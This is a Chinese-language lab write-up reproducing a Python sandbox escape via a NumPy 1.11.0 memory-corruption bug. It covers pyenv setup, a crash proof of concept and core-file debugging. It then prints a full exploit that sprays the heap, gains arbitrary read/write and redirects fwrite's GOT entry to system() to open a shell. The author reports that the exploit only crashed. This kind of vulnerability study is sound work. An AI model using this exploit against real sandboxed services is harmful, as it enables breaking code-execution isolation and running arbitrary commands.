#利用内存破坏实现Python 沙箱逃逸


### 漏洞信息

漏洞点：Numpy包存在漏洞 版本号：v1.11.0，v1.12.0已经修复了，该文中使用的python 版本为2.7.12

### 前期准备

####  配置python多版本的环境
（1）安装pyenv，首先先安装curl 和 git

	sudo apt-get install curl git-core
	
接下来安装pyenv

	curl -L https://raw.github.com/yyuu/pyenv-installer/master/bin/pyenv-installer | bash

这个命令会把pyenv安装到当前用户的 ~/.pyenv目录下.

同时， 我们还需要把下面代码存到~/.bashrc文件中：

	export PYENV_ROOT="${HOME}/.pyenv"
	
	if [ -d "${PYENV_ROOT}" ]; then
	  export PATH="${PYENV_ROOT}/bin:${PATH}"
	  eval "$(pyenv init -)"
	fi

然后使用

	source ~/.bashrc

使上述配置生效。

（2）安装一些必须的包

	sudo apt-get build-dep python2.7

（3）安装某个版本的python

	pyenv install --list #查看可安装的版本
	pyenv install 2.7.12 #安装某个版本
	pyenv versions #查看当前使用的版本
	pyenv global '版本号' #切换到某个版本
	pyenv uninstall '版本号' #卸载某个版本

（4）利用virtualenv 创建虚拟python环境
	
	pyenv virtualenv 2.7.12 env2712 #创建版本2.7.12的虚拟环境
	pyenv activate env2712 #切换和使用新的python虚拟环境
	pyenv deactivate #切换到系统环境
	rm -rf ~/.pyenv/versions/env2712/ #删除虚拟环境
	
（5）安装1.11.0版本的numpy模块
在虚拟环境中安装：

	pip install numpy==1.11.0

#### 在使用poc之前进行一些设置来捕获core文件
在root用户下：

	ulimit -c unlimited
	echo "/tmp/core-%e-%p" > /proc/sys/kernel/core_pattern

参考链接：	http://blog.csdn.net/waitfordone/article/details/52240171

### 漏洞复现

然后运行numpy_poc.py

	import numpy as np
	arr = np.array('A'*0x100)
	arr.resize(0x1000, 0x100001)
	print "bytes allocated for entire array:    " + hex(arr.nbytes) 
	print "max # of elemenets for inner array:  " + hex(arr[0].size)
	print "size of each element in inner array: " + hex(arr[0].itemsize) 
	arr[0][100000]

> gdb /home/blake/.pyenv/versions/env2712/bin/python /tmp/core-python-25293
对产生的core文件进行调试，用bt命令回溯栈

![Alt text](./1508742769293.png)

![Alt text](./1508743037425.png)



![Alt text](./1508405159239.png)


![Alt text](./1508405257263.png)

> exp.py

	import numpy as np
	
	# addr_to_str is a quick and dirty replacement for struct.pack(), needed
	# for sandbox environments that block the struct module.
	def addr_to_str(addr):
	    addr_str = "%016x" % (addr)
	    ret = str()
	    for i in range(16, 0, -2):
	        ret = ret + addr_str[i-2:i].decode('hex')
	    return ret
	
	# read_address and write_address use overflown numpy arrays to search for
	# bytearray objects we've sprayed on the heap, represented as a PyByteArray
	# structure:
	# 
	# struct PyByteArray {
	#     Py_ssize_t ob_refcnt;
	#     struct _typeobject *ob_type;
	#     Py_ssize_t ob_size;
	#     int ob_exports;
	#     Py_ssize_t ob_alloc;
	#     char *ob_bytes;
	# };
	# 
	# Once located, the pointer to actual data `ob_bytes` is overwritten with the
	# address that we want to read or write. We then cycle through the list of byte
	# arrays until we find the  one that has been corrupted. This bytearray is used
	# to read or write the desired location. Finally, we clean up by setting
	# `ob_bytes` back to its original value.
	def find_address(addr, data=None):
	    i = 0
	    j = -1
	    k = 0
	
	    if data:
	        size = 0x102
	    else:
	        size = 0x103
	    for k, arr in enumerate(arrays):
	        i = 0
	        for i in range(0x2000): # 0x2000 is a value that happens to work
	            # Here we search for the signature of a PyByteArray structure
	            j = arr[0][i].find(addr_to_str(0x1))                  # ob_refcnt
	            if (j < 0 or
	                arr[0][i][j+0x10:j+0x18] != addr_to_str(size) or  # ob_size
	                arr[0][i][j+0x20:j+0x28] != addr_to_str(size+1)): # ob_alloc
	                continue
	            idx_bytes = j+0x28                                    # ob_bytes
	
	            # Save an unclobbered copy of the bytearray metadata
	            saved_metadata = arrays[k][0][i]
	
	            # Overwrite the ob_bytes pointer with the provded address
	            addr_string = addr_to_str(addr)
	            new_metadata = (saved_metadata[0:idx_bytes] +
	                     addr_string +
	                     saved_metadata[idx_bytes+8:])
	            arrays[k][0][i] = new_metadata
	
	            ret = None
	            for bytearray_ in bytearrays:
	                try:
	                    # We differentiate the signature by size for each
	                    # find_address invocation because we don't want to
	                    # accidentally clobber the wrong  bytearray structure.
	                    # We know we've hit the structure we're looking for if
	                    # the size matches and it contents do not equal 'XXXXXXXX'
	                    if len(bytearray_) == size and bytearray_[0:8] != 'XXXXXXXX':
	                        if data:
	                            bytearray_[0:8] = data # write memory
	                        else:
	                            ret = bytearray_[0:8] # read memory
	
	                        # restore the original PyByteArray->ob_bytes
	                        arrays[k][0][i] = saved_metadata
	                        return ret
	                except:
	                    pass
	    raise Exception("Failed to find address %x" % addr)
	
	def read_address(addr):
	    return find_address(addr)
	
	def write_address(addr, data):
	    find_address(addr, data)
	
	
	# The address of GOT/PLT entries for system() and fwrite() are hardcoded. These
	# addresses are static for a given Python binary when compiled without -fPIE.
	# You can obtain them yourself with the following command:
	# `readelf -a /home/blake/.pyenv/versions/env2712/bin/python | grep -E '(system|fwrite)'
	SYSTEM = 0x081d8180
	FWRITE = 0x081d8130
	
	# Spray the heap with some bytearrays and overflown numpy arrays.
	arrays = []
	bytearrays = []
	for i in range(100):
	    arrays.append(np.array('A'*0x100))
	    arrays[-1].resize(0x1000, 0x100001)
	    bytearrays.append(bytearray('X'*0x102))
	    bytearrays.append(bytearray('X'*0x103))
	
	# Read the address of system() and write it to fwrite()'s PLT entry. 
	data = read_address(SYSTEM)
	write_address(FWRITE, data)
	
	# print() will now call system() with whatever string you pass
	print "PS1='[HACKED] $ ' /bin/sh"


### 总结
这个exploit没有打成功，只能造成崩溃，版本是对的，具体原因得调试，这篇报告主要是学习python多版本环境的搭建和使用，以及如何获取程序的崩溃文件。此文暂且到这

原文链接：https://hackernoon.com/python-sandbox-escape-via-a-memory-corruption-bug-19dde4d5fea5
